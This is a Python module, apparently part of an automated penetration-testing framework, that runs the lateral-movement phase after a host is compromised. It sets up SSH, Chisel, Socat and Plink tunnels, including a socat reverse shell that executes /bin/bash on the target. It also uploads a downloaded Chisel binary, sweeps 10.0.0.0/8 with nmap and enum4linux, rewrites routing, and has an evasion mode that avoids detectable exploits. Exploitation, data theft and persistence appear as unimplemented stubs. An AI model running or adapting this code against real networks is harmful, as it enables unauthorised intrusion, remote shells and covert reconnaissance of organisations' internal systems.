#!/usr/bin/env python3
import subprocess
import os
import json
import logging
import socket
import struct
import time
import shutil
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

class EvasionLevel(Enum):
    EVASIVE = "evasive"
    HYBRID = "hybrid"
    NON_EVASIVE = "non_evasive"

@dataclass
class Tunnel:
    type: str
    local_port: int
    target_host: str
    target_port: int
    process: Optional[subprocess.Popen] = None
    status: str = "inactive"

@dataclass
class NetworkHost:
    ip: str
    hostname: str
    os: str
    services: List[str]
    users: List[str]
    shares: List[str]
    credentials: List[Dict]
    vulnerabilities: List[Dict]

class AdvancedPivoting:
    def __init__(self, target, logger, tool_manager):
        self.target = target
        self.logger = logger
        self.tool_manager = tool_manager
        self.tunnels = {}
        self.network_segments = []
        
    def setup_ssh_tunnel(self, local_port, remote_host, remote_port):
        """Set up SSH tunnel for pivoting"""
        try:
            # Check if tunnel already exists
            tunnel_key = f"{local_port}:{remote_host}:{remote_port}"
            if tunnel_key in self.tunnels:
                return self.tunnels[tunnel_key]
                
            # Create SSH tunnel
            ssh_command = f"ssh -fN -L {local_port}:{remote_host}:{remote_port} user@{self.target}"
            result = self.tool_manager.run_tool("ssh", ssh_command)
            
            if result and "error" not in result.lower():
                self.tunnels[tunnel_key] = {
                    "type": "ssh",
                    "local_port": local_port,
                    "remote_host": remote_host,
                    "remote_port": remote_port,
                    "status": "active"
                }
                return self.tunnels[tunnel_key]
            return {"error": "Failed to create SSH tunnel"}
        except Exception as e:
            self.logger.error(f"Failed to set up SSH tunnel: {str(e)}")
            return {"error": str(e)}
            
    def setup_chisel_tunnel(self, local_port, remote_port):
        """Set up Chisel tunnel for pivoting"""
        try:
            # Check if tunnel already exists
            tunnel_key = f"chisel:{local_port}:{remote_port}"
            if tunnel_key in self.tunnels:
                return self.tunnels[tunnel_key]
                
            # Upload Chisel binary if needed
            if not self._check_chisel_installed():
                self._upload_chisel()
                
            # Start Chisel server
            server_command = f"./chisel server -p {local_port} --reverse"
            self.tool_manager.run_tool("chisel", server_command, background=True)
            
            # Start Chisel client on target
            client_command = f"ssh user@{self.target} './chisel client {self.target}:{local_port} R:{remote_port}:127.0.0.1:{remote_port}'"
            result = self.tool_manager.run_tool("ssh", client_command)
            
            if result and "error" not in result.lower():
                self.tunnels[tunnel_key] = {
                    "type": "chisel",
                    "local_port": local_port,
                    "remote_port": remote_port,
                    "status": "active"
                }
                return self.tunnels[tunnel_key]
            return {"error": "Failed to create Chisel tunnel"}
        except Exception as e:
            self.logger.error(f"Failed to set up Chisel tunnel: {str(e)}")
            return {"error": str(e)}
            
    def setup_socat_tunnel(self, local_port, remote_host, remote_port):
        """Set up Socat tunnel for pivoting"""
        try:
            # Check if tunnel already exists
            tunnel_key = f"socat:{local_port}:{remote_host}:{remote_port}"
            if tunnel_key in self.tunnels:
                return self.tunnels[tunnel_key]
                
            # Start Socat listener
            listener_command = f"socat TCP-LISTEN:{local_port},fork TCP:{remote_host}:{remote_port}"
            self.tool_manager.run_tool("socat", listener_command, background=True)
            
            # Set up reverse shell on target
            reverse_command = f"ssh user@{self.target} 'socat TCP:{self.target}:{local_port} EXEC:/bin/bash'"
            result = self.tool_manager.run_tool("ssh", reverse_command)
            
            if result and "error" not in result.lower():
                self.tunnels[tunnel_key] = {
                    "type": "socat",
                    "local_port": local_port,
                    "remote_host": remote_host,
                    "remote_port": remote_port,
                    "status": "active"
                }
                return self.tunnels[tunnel_key]
            return {"error": "Failed to create Socat tunnel"}
        except Exception as e:
            self.logger.error(f"Failed to set up Socat tunnel: {str(e)}")
            return {"error": str(e)}
            
    def setup_plink_tunnel(self, local_port, remote_host, remote_port):
        """Set up Plink tunnel for pivoting (Windows)"""
        try:
            # Check if tunnel already exists
            tunnel_key = f"plink:{local_port}:{remote_host}:{remote_port}"
            if tunnel_key in self.tunnels:
                return self.tunnels[tunnel_key]
                
            # Create Plink tunnel
            plink_command = f"plink -L {local_port}:{remote_host}:{remote_port} user@{self.target}"
            result = self.tool_manager.run_tool("plink", plink_command)
            
            if result and "error" not in result.lower():
                self.tunnels[tunnel_key] = {
                    "type": "plink",
                    "local_port": local_port,
                    "remote_host": remote_host,
                    "remote_port": remote_port,
                    "status": "active"
                }
                return self.tunnels[tunnel_key]
            return {"error": "Failed to create Plink tunnel"}
        except Exception as e:
            self.logger.error(f"Failed to set up Plink tunnel: {str(e)}")
            return {"error": str(e)}
            
    def discover_network_segments(self):
        """Discover additional network segments"""
        try:
            # Get routing information
            route_command = f"ssh user@{self.target} 'ip route'"
            route_result = self.tool_manager.run_tool("ssh", route_command)
            
            # Get interface information
            ifconfig_command = f"ssh user@{self.target} 'ifconfig'"
            ifconfig_result = self.tool_manager.run_tool("ssh", ifconfig_command)
            
            # Parse results
            self.network_segments = self._parse_network_segments(route_result, ifconfig_result)
            return self.network_segments
        except Exception as e:
            self.logger.error(f"Failed to discover network segments: {str(e)}")
            return []
            
    def scan_network_segment(self, network):
        """Scan a discovered network segment"""
        try:
            # Use nmap to scan the network
            nmap_command = f"nmap -sn {network}"
            result = self.tool_manager.run_tool("nmap", nmap_command)
            
            # Parse results
            return self._parse_nmap_results(result)
        except Exception as e:
            self.logger.error(f"Failed to scan network segment: {str(e)}")
            return []
            
    def close_tunnel(self, tunnel_key):
        """Close a specific tunnel"""
        try:
            if tunnel_key not in self.tunnels:
                return {"error": "Tunnel not found"}
                
            tunnel = self.tunnels[tunnel_key]
            
            if tunnel["type"] == "ssh":
                # Kill SSH process
                kill_command = f"pkill -f 'ssh.*{tunnel['local_port']}:{tunnel['remote_host']}:{tunnel['remote_port']}'"
                self.tool_manager.run_tool("pkill", kill_command)
            elif tunnel["type"] == "chisel":
                # Kill Chisel processes
                kill_server = f"pkill -f 'chisel server.*{tunnel['local_port']}'"
                kill_client = f"ssh user@{self.target} 'pkill -f chisel'"
                self.tool_manager.run_tool("pkill", kill_server)
                self.tool_manager.run_tool("ssh", kill_client)
            elif tunnel["type"] == "socat":
                # Kill Socat process
                kill_command = f"pkill -f 'socat.*{tunnel['local_port']}'"
                self.tool_manager.run_tool("pkill", kill_command)
            elif tunnel["type"] == "plink":
                # Kill Plink process
                kill_command = f"taskkill /F /IM plink.exe"
                self.tool_manager.run_tool("taskkill", kill_command)
                
            del self.tunnels[tunnel_key]
            return {"status": "success"}
        except Exception as e:
            self.logger.error(f"Failed to close tunnel: {str(e)}")
            return {"error": str(e)}
            
    def close_all_tunnels(self):
        """Close all active tunnels"""
        try:
            for tunnel_key in list(self.tunnels.keys()):
                self.close_tunnel(tunnel_key)
            return {"status": "success"}
        except Exception as e:
            self.logger.error(f"Failed to close all tunnels: {str(e)}")
            return {"error": str(e)}
            
    def _check_chisel_installed(self):
        """Check if Chisel is installed on the target"""
        try:
            check_command = f"ssh user@{self.target} 'which chisel'"
            result = self.tool_manager.run_tool("ssh", check_command)
            return result and "chisel" in result
        except Exception:
            return False
            
    def _upload_chisel(self):
        """Upload Chisel binary to target"""
        try:
            # Download Chisel if not present
            if not os.path.exists("chisel"):
                download_command = "curl -L https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -o chisel.gz"
                self.tool_manager.run_tool("curl", download_command)
                self.tool_manager.run_tool("gunzip", "gunzip chisel.gz")
                
            # Upload to target
            upload_command = f"scp chisel user@{self.target}:~/"
            self.tool_manager.run_tool("scp", upload_command)
            
            # Make executable
            chmod_command = f"ssh user@{self.target} 'chmod +x ~/chisel'"
            self.tool_manager.run_tool("ssh", chmod_command)
            
            return True
        except Exception as e:
            self.logger.error(f"Failed to upload Chisel: {str(e)}")
            return False
            
    def _parse_network_segments(self, route_output, ifconfig_output):
        """Parse network segments from route and ifconfig output"""
        segments = []
        try:
            # Parse routes
            for line in route_output.split('\n'):
                if 'via' in line:
                    parts = line.split()
                    if len(parts) >= 1:
                        network = parts[0]
                        if network != 'default':
                            segments.append(network)
                            
            # Parse interfaces
            for line in ifconfig_output.split('\n'):
                if 'inet ' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[1]
                        if '/' in ip:
                            network = ip.split('/')[0]
                            segments.append(f"{network}/24")
                            
            return list(set(segments))
        except Exception as e:
            self.logger.error(f"Failed to parse network segments: {str(e)}")
            return []
            
    def _parse_nmap_results(self, nmap_output):
        """Parse nmap scan results"""
        hosts = []
        try:
            for line in nmap_output.split('\n'):
                if 'Nmap scan report for' in line:
                    parts = line.split()
                    if len(parts) >= 5:
                        ip = parts[4].strip('()')
                        hosts.append(ip)
            return hosts
        except Exception as e:
            self.logger.error(f"Failed to parse nmap results: {str(e)}")
            return []

class LateralMovement:
    def __init__(self, target, logger, tool_manager=None, execution_engine=None, evasion_level=EvasionLevel.EVASIVE):
        self.target = target
        self.logger = logger
        self.tool_manager = tool_manager
        self.execution_engine = execution_engine
        self.evasion_level = evasion_level
        self.tunnels: List[Tunnel] = []
        self.findings = {
            "pivoting": {
                "established_tunnels": [],
                "failed_tunnels": [],
                "active_routes": [],
                "discovered_segments": []
            },
            "evasion_results": {
                "detected_actions": [],
                "undetected_actions": [],
                "security_measures": {}
            },
            "network_discovery": {
                "hosts": [],
                "subnets": [],
                "services": {},
                "users": {}
            },
            "vulnerability_assessment": {
                "internal_vulnerabilities": [],
                "misconfigurations": [],
                "weak_permissions": []
            },
            "exploitation_attempts": {
                "successful": [],
                "failed": [],
                "credentials_reused": []
            },
            "post_exploitation": {
                "compromised_hosts": [],
                "extracted_data": [],
                "persistence_established": []
            }
        }
        self.output_dir = f"reports/lateral_movement_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Load post-exploitation results
        self.post_exploitation_results = self._load_post_exploitation_results()
        
        # Initialize network hosts
        self.network_hosts = []
        
        # Initialize AdvancedPivoting
        self.advanced_pivoting = AdvancedPivoting(target, logger, tool_manager)

    def _load_post_exploitation_results(self):
        """Load results from post-exploitation stage"""
        try:
            post_exploitation_dir = max([d for d in os.listdir("reports") if d.startswith("post_exploitation_")])
            with open(f"reports/{post_exploitation_dir}/findings.json", 'r') as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(f"Failed to load post-exploitation results: {str(e)}")
            return None

    def run(self):
        """Run the lateral movement phase"""
        self.logger.info("Starting Lateral Movement phase...")
        
        # 1. Establish pivoting
        self.logger.info("Establishing pivoting...")
        self.establish_pivoting()
        
        # 2. Discover network
        self.logger.info("Discovering network...")
        self.discover_network()
        
        # 3. Assess vulnerabilities
        self.logger.info("Assessing vulnerabilities...")
        self.assess_vulnerabilities()
        
        # 4. Attempt exploitation
        self.logger.info("Attempting exploitation...")
        self.attempt_exploitation()
        
        # 5. Perform post-exploitation
        self.logger.info("Performing post-exploitation...")
        self.perform_post_exploitation()
        
        # Save findings
        self._save_findings()
        
        return self.findings

    def establish_pivoting(self):
        """Establish pivoting to internal network"""
        # Check if we have necessary tools
        if not self._check_pivoting_tools():
            self.logger.error("Required pivoting tools not available")
            return
        
        # Discover network segments first
        discovered_segments = self.advanced_pivoting.discover_network_segments()
        self.findings["pivoting"]["discovered_segments"] = discovered_segments
        
        # Establish SSH tunnel
        if self.advanced_pivoting.setup_ssh_tunnel(9050, "127.0.0.1", 9050):
            self.findings["pivoting"]["established_tunnels"].append({
                "type": "ssh",
                "status": "active",
                "timestamp": datetime.now().isoformat()
            })
        
        # Try to establish Chisel tunnel if available
        if shutil.which("chisel"):
            if self.advanced_pivoting.setup_chisel_tunnel(9050, "127.0.0.1", 9050):
                self.findings["pivoting"]["established_tunnels"].append({
                    "type": "chisel",
                    "status": "active",
                    "timestamp": datetime.now().isoformat()
                })
        
        # Update routing table
        self._update_routing()

    def discover_network(self):
        """Discover network from internal perspective"""
        if self.execution_engine:
            # Network discovery
            self.execution_engine.add_task("network_scan", self.run_command,
                "nmap -sn -PR -PS22,25,80,135,139,445,1433,3306,3389,8080 -PA21,23,80,3389 -PE -PP -PM -PO 10.0.0.0/8", priority=1)
            
            # Service enumeration
            self.execution_engine.add_task("service_enum", self.run_command,
                "nmap -sV -sC -T4 -p- --min-rate=1000 10.0.0.0/8", priority=2)
            
            # User enumeration
            self.execution_engine.add_task("user_enum", self.run_command,
                "enum4linux -a 10.0.0.0/8", priority=3)
            
            # Run tasks
            results = self.execution_engine.run_parallel()
            
            # Process results
            self._process_network_discovery(results)

    def assess_vulnerabilities(self):
        """Assess vulnerabilities from internal perspective"""
        for host in self.network_hosts:
            try:
                # Check for misconfigurations
                misconfigs = self._check_misconfigurations(host)
                if misconfigs:
                    self.findings["vulnerability_assessment"]["misconfigurations"].extend(misconfigs)
                
                # Check for weak permissions
                weak_perms = self._check_weak_permissions(host)
                if weak_perms:
                    self.findings["vulnerability_assessment"]["weak_permissions"].extend(weak_perms)
                
                # Check for internal vulnerabilities
                vulns = self._check_internal_vulnerabilities(host)
                if vulns:
                    self.findings["vulnerability_assessment"]["internal_vulnerabilities"].extend(vulns)
            except Exception as e:
                self.logger.error(f"Failed to assess vulnerabilities for {host.ip}: {str(e)}")

    def attempt_exploitation(self):
        """Attempt exploitation of discovered vulnerabilities"""
        for host in self.network_hosts:
            for vuln in host.vulnerabilities:
                try:
                    if self._is_safe_to_exploit(vuln):
                        result = self._attempt_exploitation(host, vuln)
                        if result["success"]:
                            self.findings["exploitation_attempts"]["successful"].append({
                                "host": host.ip,
                                "vulnerability": vuln,
                                "method": result["method"],
                                "timestamp": datetime.now().isoformat()
                            })
                        else:
                            self.findings["exploitation_attempts"]["failed"].append({
                                "host": host.ip,
                                "vulnerability": vuln,
                                "reason": result["reason"],
                                "timestamp": datetime.now().isoformat()
                            })
                except Exception as e:
                    self.logger.error(f"Failed to exploit {vuln} on {host.ip}: {str(e)}")

    def perform_post_exploitation(self):
        """Perform post-exploitation on compromised hosts"""
        for host in self.network_hosts:
            if self._is_host_compromised(host):
                try:
                    # Gather system information
                    sys_info = self._gather_system_info(host)
                    
                    # Extract sensitive data
                    sensitive_data = self._extract_sensitive_data(host)
                    
                    # Establish persistence
                    persistence = self._establish_persistence(host)
                    
                    self.findings["post_exploitation"]["compromised_hosts"].append({
                        "host": host.ip,
                        "system_info": sys_info,
                        "sensitive_data": sensitive_data,
                        "persistence": persistence,
                        "timestamp": datetime.now().isoformat()
                    })
                except Exception as e:
                    self.logger.error(f"Failed to perform post-exploitation on {host.ip}: {str(e)}")

    def _check_pivoting_tools(self) -> bool:
        """Check if required pivoting tools are available"""
        required_tools = ["ssh", "socat", "chisel"]
        for tool in required_tools:
            if not shutil.which(tool):
                self.logger.error(f"Required tool {tool} not found")
                return False
        return True

    def _update_routing(self):
        """Update routing table for pivoting"""
        try:
            # Add route through pivot
            self.run_command(f"route add -net 10.0.0.0/8 gw {self.target}")
            self.findings["pivoting"]["active_routes"].append({
                "network": "10.0.0.0/8",
                "gateway": self.target,
                "timestamp": datetime.now().isoformat()
            })
        except Exception as e:
            self.logger.error(f"Failed to update routing: {str(e)}")

    def _process_network_discovery(self, results: Dict):
        """Process network discovery results"""
        if "network_scan" in results:
            hosts = self._parse_network_scan(results["network_scan"])
            self.findings["network_discovery"]["hosts"].extend(hosts)
        
        if "service_enum" in results:
            services = self._parse_service_enum(results["service_enum"])
            self.findings["network_discovery"]["services"].update(services)
        
        if "user_enum" in results:
            users = self._parse_user_enum(results["user_enum"])
            self.findings["network_discovery"]["users"].update(users)

    def _check_misconfigurations(self, host: NetworkHost) -> List[Dict]:
        """Check for misconfigurations on a host"""
        misconfigs = []
        
        # Check service configurations
        for service in host.services:
            if self._is_service_misconfigured(service):
                misconfigs.append({
                    "host": host.ip,
                    "service": service,
                    "type": "misconfiguration",
                    "description": "Service misconfigured"
                })
        
        return misconfigs

    def _check_weak_permissions(self, host: NetworkHost) -> List[Dict]:
        """Check for weak permissions on a host"""
        weak_perms = []
        
        # Check share permissions
        for share in host.shares:
            if self._has_weak_permissions(share):
                weak_perms.append({
                    "host": host.ip,
                    "share": share,
                    "type": "weak_permission",
                    "description": "Share has weak permissions"
                })
        
        return weak_perms

    def _check_internal_vulnerabilities(self, host: NetworkHost) -> List[Dict]:
        """Check for internal vulnerabilities on a host"""
        vulns = []
        
        # Check for known vulnerabilities
        for service in host.services:
            if self._is_service_vulnerable(service):
                vulns.append({
                    "host": host.ip,
                    "service": service,
                    "type": "vulnerability",
                    "description": "Service has known vulnerability"
                })
        
        return vulns

    def _is_safe_to_exploit(self, vulnerability: Dict) -> bool:
        """Check if it's safe to exploit a vulnerability"""
        if self.evasion_level == EvasionLevel.NON_EVASIVE:
            return True
        
        # Check if vulnerability is likely to be detected
        high_visibility_vulns = ["remote_code_execution", "denial_of_service"]
        if vulnerability["type"] in high_visibility_vulns and self.evasion_level == EvasionLevel.EVASIVE:
            return False
        
        return True

    def _attempt_exploitation(self, host: NetworkHost, vulnerability: Dict) -> Dict:
        """Attempt to exploit a vulnerability"""
        # Implement exploitation attempt
        return {
            "success": False,
            "method": None,
            "reason": "Not implemented"
        }

    def _is_host_compromised(self, host: NetworkHost) -> bool:
        """Check if a host is compromised"""
        return any(attempt["host"] == host.ip for attempt in self.findings["exploitation_attempts"]["successful"])

    def _gather_system_info(self, host: NetworkHost) -> Dict:
        """Gather system information from a compromised host"""
        # Implement system information gathering
        return {}

    def _extract_sensitive_data(self, host: NetworkHost) -> List[Dict]:
        """Extract sensitive data from a compromised host"""
        # Implement sensitive data extraction
        return []

    def _establish_persistence(self, host: NetworkHost) -> Dict:
        """Establish persistence on a compromised host"""
        # Implement persistence establishment
        return {}

    def _save_findings(self):
        """Save findings to JSON file"""
        output_file = f"{self.output_dir}/findings.json"
        with open(output_file, 'w') as f:
            json.dump(self.findings, f, indent=4)
        self.logger.info(f"Findings saved to {output_file}")

    def run_command(self, command, capture_output=True):
        """Run a system command and return the output"""
        if self.tool_manager:
            return self.tool_manager.run_tool(command.split()[0], command, capture_output)
        else:
            try:
                result = subprocess.run(command.split(), capture_output=capture_output, text=True)
                if result.returncode != 0:
                    self.logger.error(f"Command failed: {result.stderr}")
                    return None
                return result.stdout
            except Exception as e:
                self.logger.error(f"Error executing command: {str(e)}")
                return None 